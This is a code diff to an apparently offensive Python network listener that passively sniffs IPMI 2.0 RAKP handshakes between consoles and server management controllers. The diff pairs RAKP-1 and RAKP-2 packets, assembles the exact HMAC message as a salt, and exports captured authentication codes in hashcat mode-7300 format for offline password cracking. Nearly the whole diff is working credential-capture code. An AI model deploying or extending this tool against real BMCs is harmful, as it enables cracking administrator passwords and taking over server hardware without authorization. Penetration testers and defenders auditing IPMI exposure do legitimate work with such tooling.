@@ -75,6 +75,21 @@ class IPMICredential:
     auth_type: str = ""
     timestamp: str = ""
     rakp_hash: str = ""  # RAKP-2 key-exchange auth code (crackable HMAC), hex
+    rakp_salt: str = ""  # hashcat-7300 salt blob (HMAC message), hex
+
+    @property
+    def hashcat_format(self) -> str:
+        """Hashcat-compatible hash string (mode 7300, IPMI2 RAKP HMAC-SHA1).
+
+        Format: ``<salt_hex>:<hmac_hex>`` where salt is the exact HMAC message
+        the BMC signed -- SIDm‖SIDc‖Rm‖Rc‖GUIDc‖RoleM‖ULengthM‖UNameM -- and the
+        hash is the RAKP-2 key-exchange auth code. Verified against the hashcat
+        example_hashes mode-7300 vector. Returns "" unless both halves are
+        present (RAKP-1 and RAKP-2 both captured).
+        """
+        if self.rakp_salt and self.rakp_hash:
+            return f"{self.rakp_salt}:{self.rakp_hash}"
+        return ""
 
     @property
     def server_ip(self) -> str:
@@ -146,10 +161,11 @@ class IPMIPassiveListener(PySharkListenerBase):
         self._seen_creds: set = set()
         # Track BMC details
         self.bmc_info: Dict[str, Dict[str, Any]] = {}
-        # RAKP-1 (client -> BMC) carries the username; RAKP-2 (BMC -> client)
-        # carries the crackable HMAC. They are separate packets, so stash the
-        # RAKP-1 username keyed by the BMC IP and pair it when RAKP-2 arrives.
-        self._rakp_users: Dict[str, str] = {}
+        # RAKP-1 (client -> BMC) carries the username + the SIDc/Rm/Role/ULen
+        # salt material; RAKP-2 (BMC -> client) carries SIDm/Rc/GUID + the
+        # crackable HMAC. They are separate packets, so stash the RAKP-1 parts
+        # keyed by the BMC IP and assemble the mode-7300 salt when RAKP-2 lands.
+        self._rakp1: Dict[str, Dict[str, Any]] = {}
 
     def _format_protocol_columns(self, ix: ProtocolInteraction) -> List[Any]:
         """Format IPMI interaction as protocol-specific table columns."""
@@ -253,23 +269,27 @@ class IPMIPassiveListener(PySharkListenerBase):
             detail = payload_type_name
             if "Message 1" in payload_type_name:
                 detail = "RAKP-1 (username + random)"
-                # RAKP-1 (client -> BMC) carries the username being authenticated.
-                # The BMC is the destination; stash the username under it so the
-                # RAKP-2 response from that BMC can be paired with it.
-                username = self._parse_rakp1_username(packet)
-                if username:
-                    self._rakp_users[dst_ip] = username
+                # RAKP-1 (client -> BMC) carries the username + the SIDc/Rm/Role
+                # /ULen salt material. The BMC is the destination; stash the parts
+                # under it so the RAKP-2 response can be paired and the 7300 salt
+                # assembled.
+                r1 = self._parse_rakp1(packet)
+                if r1:
+                    self._rakp1[dst_ip] = r1
             elif "Message 2" in payload_type_name:
                 detail = "RAKP-2 (HMAC hash)"
-                # RAKP-2 (BMC -> client) carries the crackable key-exchange auth
-                # code (HMAC). The BMC is the source; recover the username seen in
-                # the matching RAKP-1 (may be absent if RAKP-1 was not captured).
-                rakp_hash = self._parse_rakp2_hash(packet)
-                if rakp_hash:
-                    username = self._rakp_users.get(src_ip, "")
+                # RAKP-2 (BMC -> client) carries SIDm/Rc/GUID + the crackable
+                # key-exchange auth code (HMAC). The BMC is the source; pair with
+                # the matching RAKP-1 to build the full mode-7300 salt.
+                r2 = self._parse_rakp2(packet)
+                if r2:
+                    r1 = self._rakp1.get(src_ip, {})
+                    username = r1.get("username", "")
+                    rakp_salt = self._build_rakp_salt(r1, r2) if r1 else ""
                     self.logger.info(
                         f"IPMI RAKP-2 hash from BMC {src_ip} -> {dst_ip} "
-                        f"user={username or '(unknown)'}"
+                        f"user={username or '(unknown)'} "
+                        f"salt={'yes' if rakp_salt else 'no (RAKP-1 missing)'}"
                     )
                     self._record_credential(
                         username=username,
@@ -278,7 +298,8 @@ class IPMIPassiveListener(PySharkListenerBase):
                         dst_ip=src_ip,
                         dest_port=src_port if src_port else 623,
                         auth_type="RMCP+ RAKP",
-                        rakp_hash=rakp_hash,
+                        rakp_hash=r2["hmac"],
+                        rakp_salt=rakp_salt,
                     )
                 else:
                     self.logger.info(
@@ -391,45 +412,82 @@ class IPMIPassiveListener(PySharkListenerBase):
         except ValueError:
             return b""
 
-    def _parse_rakp1_username(self, packet) -> str:
-        """Extract the username from a RAKP Message 1 body.
+    def _parse_rakp1(self, packet) -> Dict[str, Any]:
+        """Extract the salt-relevant fields from a RAKP Message 1 body.
 
         RAKP-1 layout (IPMI 2.0, after the session wrapper):
             [0]    message tag
             [1:4]  reserved
-            [4:8]  managed system session ID
-            [8:24] remote console random number (16 bytes)
-            [24]   requested maximum privilege level
+            [4:8]  managed system (BMC) session ID  (SIDc)
+            [8:24] remote console random number (16 bytes)  (Rm)
+            [24]   requested maximum privilege level  (RoleM)
             [25:27] reserved
-            [27]   username length (N)
-            [28:28+N] username
+            [27]   username length (N)  (ULengthM)
+            [28:28+N] username  (UNameM)
+
+        Returns {} unless the full username field is present.
         """
         body = self._rakp_payload_bytes(packet)
         if len(body) < 28:
-            return ""
+            return {}
         ulen = body[27]
         if ulen == 0 or len(body) < 28 + ulen:
-            return ""
+            return {}
+        uname = body[28 : 28 + ulen]
         try:
-            return body[28 : 28 + ulen].decode("latin1").strip("\x00")
+            username = uname.decode("latin1").strip("\x00")
         except Exception:
-            return ""
+            username = ""
+        return {
+            "sidc": body[4:8],
+            "rm": body[8:24],
+            "role": body[24:25],
+            "ulen": body[27:28],
+            "uname": uname,
+            "username": username,
+        }
 
-    def _parse_rakp2_hash(self, packet) -> str:
-        """Extract the key-exchange auth code (crackable HMAC) from RAKP-2.
+    def _parse_rakp2(self, packet) -> Dict[str, Any]:
+        """Extract the salt-relevant fields + HMAC from a RAKP Message 2 body.
 
         RAKP-2 layout (IPMI 2.0, after the session wrapper):
             [0]     message tag
             [1:4]   reserved
-            [4:8]   remote console session ID
-            [8:24]  managed system (BMC) random number (16 bytes)
-            [24:40] managed system (BMC) GUID (16 bytes)
-            [40:]   key exchange authentication code (HMAC, 0/12/16/20/32 bytes)
+            [4:8]   remote console session ID  (SIDm)
+            [8:24]  managed system (BMC) random number (16 bytes)  (Rc)
+            [24:40] managed system (BMC) GUID (16 bytes)  (GUIDc)
+            [40:]   key exchange authentication code (HMAC, 12/16/20/32 bytes)
         """
         body = self._rakp_payload_bytes(packet)
         if len(body) <= 40:
+            return {}
+        return {
+            "sidm": body[4:8],
+            "rc": body[8:24],
+            "guid": body[24:40],
+            "hmac": body[40:].hex(),
+        }
+
+    @staticmethod
+    def _build_rakp_salt(r1: Dict[str, Any], r2: Dict[str, Any]) -> str:
+        """Assemble the hashcat-7300 salt = the exact RAKP HMAC message.
+
+        SIDm ‖ SIDc ‖ Rm ‖ Rc ‖ GUIDc ‖ RoleM ‖ ULengthM ‖ UNameM, hex-encoded.
+        """
+        try:
+            salt = (
+                r2["sidm"]
+                + r1["sidc"]
+                + r1["rm"]
+                + r2["rc"]
+                + r2["guid"]
+                + r1["role"]
+                + r1["ulen"]
+                + r1["uname"]
+            )
+        except KeyError:
             return ""
-        return body[40:].hex()
+        return salt.hex()
 
     def _record_credential(
         self,
@@ -440,6 +498,7 @@ class IPMIPassiveListener(PySharkListenerBase):
         dest_port: int = 623,
         auth_type: str = "",
         rakp_hash: str = "",
+        rakp_salt: str = "",
     ) -> None:
         """Record an extracted IPMI credential."""
         cred_key = (username, credential_type, src_ip, dst_ip)
@@ -456,6 +515,7 @@ class IPMIPassiveListener(PySharkListenerBase):
             auth_type=auth_type,
             timestamp=datetime.now().isoformat(),
             rakp_hash=rakp_hash,
+            rakp_salt=rakp_salt,
         )
         self.credentials.append(cred)
 
@@ -480,3 +540,11 @@ class IPMIPassiveListener(PySharkListenerBase):
             }
             for cred in self.credentials
         ]
+
+    def get_hashcat_hashes(self) -> List[str]:
+        """Get RAKP hashes in hashcat mode-7300 format (``salt:hmac``).
+
+        Delegates to the per-credential property; entries missing the RAKP-1
+        salt material (RAKP-1 not captured) yield "" and are skipped.
+        """
+        return [c.hashcat_format for c in self.credentials if c.hashcat_format]
